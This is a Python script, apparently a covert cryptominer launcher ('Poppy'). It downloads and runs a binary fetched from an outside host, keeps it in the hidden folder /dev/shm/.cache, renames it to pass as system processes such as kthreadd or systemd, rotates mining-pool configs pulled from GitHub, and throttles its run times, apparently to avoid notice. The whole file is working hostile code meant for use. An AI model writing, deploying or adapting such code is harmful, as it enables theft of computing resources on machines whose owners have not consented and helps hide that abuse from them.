import os
import random
import string
import subprocess
import time
import urllib.request
import shutil

# === CONFIGURATIONS ===
pools = [
    "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-01/refs/heads/main/config.ini",  #
    "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-02/refs/heads/main/config.ini",  #
    "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-03/refs/heads/main/config.ini",  #
    "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-04/refs/heads/main/config.ini",  #
]
download_url = "https://ai.myloveistrikupoppy.my.id/cache"
download_output = "cache.tar.gz"
binary_folder = "/dev/shm/.cache"
run_minutes = 20
rest_minutes = 5
long_rest_minutes = 10
max_runs = 10

# === BINARY NAME ROTATION ===
def random_binary_name():
    names = [
        "kthreadd", "systemd", "syslogd", "dbus-daemon", "bashd",
        "initd", "udevd", "rsyslog", "netd", "cronlog"
    ]
    return random.choice(names) + random.choice(string.ascii_letters)

# === CLEANUP AND DOWNLOAD ===
def prepare_miner(pool_config_url, binary_name):
    if os.path.exists(binary_folder):
        shutil.rmtree(binary_folder)
    os.makedirs(binary_folder, exist_ok=True)
    os.chdir(binary_folder)

    print(f"[Poppy] Downloading cache from {download_url}")
    urllib.request.urlretrieve(download_url, download_output)
    subprocess.run(["tar", "-xzf", download_output], check=True)

    print(f"[Poppy] Downloading config from {pool_config_url}")
    urllib.request.urlretrieve(pool_config_url, "config.ini")

    # Rename binary
    original_binary = os.path.join(binary_folder, "cache")  # Ganti jika nama default bukan "cache"
    renamed_binary = os.path.join(binary_folder, binary_name)
    os.rename(original_binary, renamed_binary)
    os.chmod(renamed_binary, 0o755)

    return renamed_binary

# === MINER EXECUTION ===
def run_miner(miner_path, duration_minutes):
    print(f"[Poppy] Running {miner_path} for {duration_minutes} minutes")
    proc = subprocess.Popen([miner_path])
    time.sleep(duration_minutes * 60)
    proc.terminate()
    proc.wait()
    print("[Poppy] stopped")

# === MAIN LOOP ===
def main():
    run_counter = 0
    while True:
        for i in range(max_runs):
            pool_config = pools[i % len(pools)]
            binary_name = random_binary_name()
            miner_path = prepare_miner(pool_config, binary_name)

            run_miner(miner_path, run_minutes)

            print(f"[Poppy] Resting {rest_minutes} minutes...")
            time.sleep(rest_minutes * 60)
            run_counter += 1

        print(f"[Poppy] Finished {max_runs} runs. Long rest for {long_rest_minutes} minutes...")
        time.sleep(long_rest_minutes * 60)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("[Poppy] Stopped by user.")
